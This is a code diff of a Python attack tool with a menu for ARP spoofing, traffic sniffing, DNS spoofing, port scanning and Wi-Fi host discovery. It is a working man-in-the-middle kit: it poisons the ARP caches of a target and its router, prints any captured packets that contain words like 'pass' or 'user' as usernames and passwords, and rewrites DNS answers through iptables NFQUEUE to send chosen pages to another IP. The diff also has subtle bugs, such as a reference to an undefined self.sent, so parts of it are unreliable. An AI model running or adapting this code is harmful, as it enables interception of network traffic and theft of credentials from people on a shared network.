@@ -15,80 +15,78 @@ class arp_spoof:
     def __init__(self, cikl, time, Tar_IP, Route_IP, choice):
         self.number_of_sent=0
         self.stopped=False
-        self.Route_IP=Route_IP
-        self.Target_IP=Target_IP
-        self.Tar_Mac=self.get_Mac_by_IP(Tar_IP)
-        self.Route_Mac=self.get_Mac_by_IP(Route_IP)
+        Tar_Mac=self.get_Mac_by_IP(Tar_IP)
+        Route_Mac=self.get_Mac_by_IP(Route_IP)
         if choice == 'snif':
             Thread(target=self.snif, args=(input(f'[+]Enter interface ⟶ {Style.RESET_ALL}'), )).start()
         elif choice == 'queue':
-            all_blocked = input(f'{Fore.LIGHTBLACK_EX}[+]Enter spoofing pages, using cumma ⟶ ')
+            blocked_pages = input(f'{Fore.LIGHTBLACK_EX}[+]Enter spoofing pages, using cumma ⟶ ').replace(' ', '')
             self.ip_spoof = input(f'{Fore.GREEN}[+]Enter new IP of spoofing pages ⟶ {Style.RESET_ALL}')
-            if all_blocked.replace(',', '') != all_blocked:
-                all_blocked=all_blocked.replace(' ', '').split(', ')
-                self.alls=[]
-                for i in all_blocked:
-                    i=i.replace('https://', '').replace('http://', '') 
-                    self.alls.append(i)
+            if ',' in blocked_pages:
+                blocked_pages=blocked_pages.split(',')
+                self.pages=[]
+                for blocked_page in blocked_pages:
+                    blocked_page=blocked_page.replace('https://', '').replace('http://', '') 
+                    self.pages.append(blocked_page)
             else:
-                self.alls=[all_blocked.replace('https://', '').replace('http://', '')]
+                self.pages=[blocked_pages.replace('https://', '').replace('http://', '')]
             Thread(target=self.queue_run, args=()).start()
-        Thread(target=self.spoof, args=(Tar_IP, self.Tar_Mac, Route_IP, cikl, time, )).start()
-        Thread(target=self.spoof, args=(Route_IP, self.Route_Mac, Tar_IP, cikl, time, )).start()
+        Thread(target=self.spoof, args=(Tar_IP, Tar_Mac, Route_IP, Route_Mac, cikl, time, )).start()
         while True:
-            sleep(time+0.2)
+            sleep(time)
             if self.stopped == False:  
                 print(f'[+]Sent {self.number_of_sent} packets.', end='\r')
             else:
                 print('\rStopped', end='')            
 
     def get_Mac_by_IP(self, IP):
-        packet=sc.Ether(dst='ff:ff:ff:ff:ff:ff')/sc.ARP(pdst=IP)
-        ans=sc.srp(packet, verbose=False, timeout=1)[0]
         while True:
-            try:
-                return ans[0][1].hwsrc
-                break
-            except:
-                pass
+            for index in range(200):
+                try:
+                    packet=sc.Ether(dst='ff:ff:ff:ff:ff:ff')/sc.ARP(pdst=IP)
+                    ans=sc.srp(packet, verbose=False, timeout=1)[0]
+                    return ans[0][1].hwsrc
+                    break
+                except:
+                    pass
+            print('\r[-]Can`t find this host in the network!')
 
     def get_IP_by_Mac(self, Mac):
-        packet=sc.Ether(dst=Mac)/sc.ARP(pdst='192.168.1.1/24')
-        ans=sc.srp(packet, verbose=False, timeout=1)[0]
         while True:
-            try:
-                return ans[0][1].psrc
-                break
-            except:
-                pass
+            for index in range(200):
+                try:
+                    packet=sc.Ether(dst=Mac)/sc.ARP(pdst='192.168.1.1/24')
+                    ans=sc.srp(packet, verbose=False, timeout=1)[0]
+                    return ans[0][1].psrc
+                    break
+                except:
+                    pass
+            print('\r[-]Can`t find this host in the network!')
 
-    def spoof(self, pdst_Mac, hwdstt, psrcc_Mac, cikl, time):
+    def spoof(self, Target_IP, Tar_Mac, Spoof_IP, Spoof_Mac, cikl, time):
+        pack1 = sc.ARP(op=2, pdst=Target_IP, hwdst=Tar_Mac, psrc=Spoof_IP)
+        pack2 = sc.ARP(op=2, pdst=Spoof_IP, hwdst=Spoof_Mac, psrc=Target_IP)
         while True:
-            if self.stopped == False:
-                if self.number_of_sent % cikl == 0:
-                    pdstt = self.get_IP_by_Mac(self.Tar_Mac)
-                    psrcc = self.get_IP_by_Mac(self.Route_Mac)
-                sc.send(sc.ARP(op=2, pdst=pdstt, hwdst=hwdstt, psrc=psrcc), verbose=False, count=4)
-                sleep(time/5)
-                self.number_of_sent+=1
-
-    def stop(self):
-        self.stopped=True
-
-    def resume(self):
-        self.stopped=False
+                if self.sent % cikl == 0:
+                    Target_IP=self.get_IP_by_Mac(Tar_Mac)
+                    Spoof_IP=self.get_IP_by_Mac(Spoof_Mac)
+                    pack1 = sc.ARP(op=2, pdst=Target_IP, hwdst=Tar_Mac, psrc=Spoof_IP)
+                    pack2 = sc.ARP(op=2, pdst=Spoof_IP, hwdst=Spoof_Mac, psrc=Target_IP)
+                sc.send(pack1, verbose=False, count=4)
+                sc.send(pack2, verbose=False, count=4)
+                self.number_of_sent+=2
+                sleep(time)
 
     def snif(self, interface):
         sc.sniff(iface=interface, store=False, prn=self.process_sniffed_paccket)
 
     def get_auth_info(self, text):
-        stop = False
         for verb in ['pass', 'nick', 'name', 'user']:
             if verb in text or '":"' in text:
-                return True
-                stop=True
-        if stop == False:
-            return False
+                return 1
+            elif verb in text:
+                return 2
+        return False
 
     def process_sniffed_paccket(self, packet):
         if packet.haslayer(sc.Raw) and packet.haslayer(sc.IP):
@@ -98,25 +96,24 @@ class arp_spoof:
                     print(f'[+] HTTP/HTTPS Request >> {url}', end='\n\n')
                 except:
                     pass
-                load_data=str(packet[sc.Raw].load).replace('\\n', '\n').replace('\\r', '\r')
-                if self.get_auth_info(load_data):
-                    print(f'\n\n[+] Username/password >> \n{load_data}\n\n')
-                else:
-                    try:
-                        print(packet.Host)
-                    except:
-                        pass
+
+                load_data = str(packet[sc.Raw].load).replace('\\n', '\n').replace('\\r', '\r')
+                data_info = self.get_auth_info(load_data)
+                format_string = 'Username/password' if data_info == 1 else 'Some data' if data_info == 2 else None
+                if format_string:
+                    print(f'\n\n[+] {format_string} >> \n{load_data}\n\n')
+
     def queue_run(self):
         call('sudo iptables --flush', shell=True)
         call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 1', shell=True)
         call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 1', shell=True)
         qu = NetfilterQueue()
         qu.bind(1, self.process_packet)
-
         try:
             qu.run()
         except KeyboardInterrupt:
             call('iptables --flush', shell=True)
+
     def process_packet(self, packet):
         scapy_packet = sc.IP(packet.get_payload())
         if scapy_packet.haslayer(sc.DNSRR):
@@ -143,6 +140,7 @@ class arp_spoof:
                         print(scapy_packet[sc.IP].show())
                     packet.set_payload(bytes(scapy_packet))
         packet.accept()
+
 class Scan:
     def __init__(self, host, N_THREADS):
         self.host=host
@@ -164,7 +162,6 @@ class Scan:
         try:
             s = socket.socket()
             s.connect((self.host, port))
-
         except:
             print(f"{self.GRAY}{port:5} is closed  {self.RESET}", end='\r')
         else:
@@ -191,40 +188,43 @@ class scanner_wifi:
             ipandmac.append([i[1].psrc, i[1].hwsrc])
         return ipandmac
 
-green=Fore.GREEN
-red=Fore.CYAN
-reset=Style.RESET_ALL
+exit_ = lambda: exit(str(reset)+'\r[-]Exiting...')
+green = Fore.GREEN
+red = Fore.CYAN
+reset = Style.RESET_ALL
 print(reset, end='')
-while True:
-    print(f"{red}1 ⟶ ARP Spoof\n{green}2 ⟶ ARP Spoof + Snif\n{red}3 ⟶ DNS Spoofing\n{green}4 ⟶ Ports scan\n{red}5 ⟶ Wifi Scanner{reset}\n\n6 ⟶ Clear\n7 ⟶ Exit\n")
-    a=input(Fore.MAGENTA)
-    if a == '1' or a == '2' or a == '3':
-        cikl=int(input(f'{Fore.GREEN}[+] Enter cicle ⟶ '))
-        time=int(input(f'{Fore.LIGHTBLACK_EX}[+] Enter time ⟶ '))
-        call('sysctl -w net.ipv4.ip_forward='+input(f'{Fore.GREEN}[+] Forwarding 0/1 ⟶ '), shell=True)
-        Route_IP=input(f'{Fore.LIGHTBLACK_EX}[+]Enter Router IP ⟶ ')
-        Tar_IP=Route_IP+input(f'{Fore.GREEN}[+]Enter Target IP ⟶ {Route_IP}')
-        if a == '1':
-            arp_spoof(cikl, time, Tar_IP, Route_IP, 'not')
-        if a == '2':
-            arp_spoof(cikl, time, Tar_IP, Route_IP, 'snif')
-        if a == '3':
-            arp_spoof(cikl, time, Tar_IP, Route_IP, 'queue')
-    elif a == '4':
-        hostt=input(f'{Fore.GREEN}[+] Enter host ⟶ ')
-        threads=int(input(f'{Fore.LIGHTBLACK_EX}[+] Enter number of threads ⟶ {Fore.MAGENTA}'))
-        Scan(hostt, threads)
-    elif a == '5':
-        scanner_wifi()
-    elif a =='6':
-        call('clear')
-    else:
-        print(reset)
-        exit()
-    if a != '6':
-        print(f'\n{green}1 ⟶ Next with clear\n2 ⟶ Next without clear{reset}')
-        ch=input(Fore.MAGENTA)
-        if ch == '1':
+try:
+    while True:
+        print(f"{red}1. ARP Spoof\n{green}2. ARP Spoof + Snif\n{red}3. DNS Spoofing\n{green}4. Ports scan\n{red}5. Wifi Scanner{reset}\n\n6. Clear\n7. Exit\n")
+        a=input(Fore.MAGENTA)
+        if a in '123':
+            cikl=int(input(f'{Fore.GREEN}[+] Enter cicle --> '))
+            time=int(input(f'{Fore.LIGHTBLACK_EX}[+] Enter time --> '))
+            call('sysctl -w net.ipv4.ip_forward='+input(f'{Fore.GREEN}[+] Forwarding 0/1 --> '), shell=True)
+            Route_IP=input(f'{Fore.LIGHTBLACK_EX}[+]Enter Router IP --> ')
+            Tar_IP=Route_IP+input(f'{Fore.GREEN}[+]Enter Target IP --> {Route_IP}')
+            if a == '1':
+                arp_spoof(cikl, time, Tar_IP, Route_IP, 'not')
+            if a == '2':
+                arp_spoof(cikl, time, Tar_IP, Route_IP, 'snif')
+            if a == '3':
+                arp_spoof(cikl, time, Tar_IP, Route_IP, 'queue')
+        elif a == '4':
+            host=input(f'{Fore.GREEN}[+] Enter host --> ')
+            threads=int(input(f'{Fore.LIGHTBLACK_EX}[+] Enter number of threads --> {Fore.MAGENTA}'))
+            Scan(host, threads)
+        elif a == '5':
+            scanner_wifi()
+        elif a =='6':
             call('clear')
-        elif ch == '2':
-            print('\n\n')
+        else:
+            exit_()
+        if a != '6':
+            print(f'\n{green}1. Go next with clear\n2. Go next without clear{reset}')
+            ch=input(Fore.MAGENTA)
+            if ch == '1':
+                call('clear')
+            elif ch == '2':
+                print('\n\n')
+except:
+    exit_()
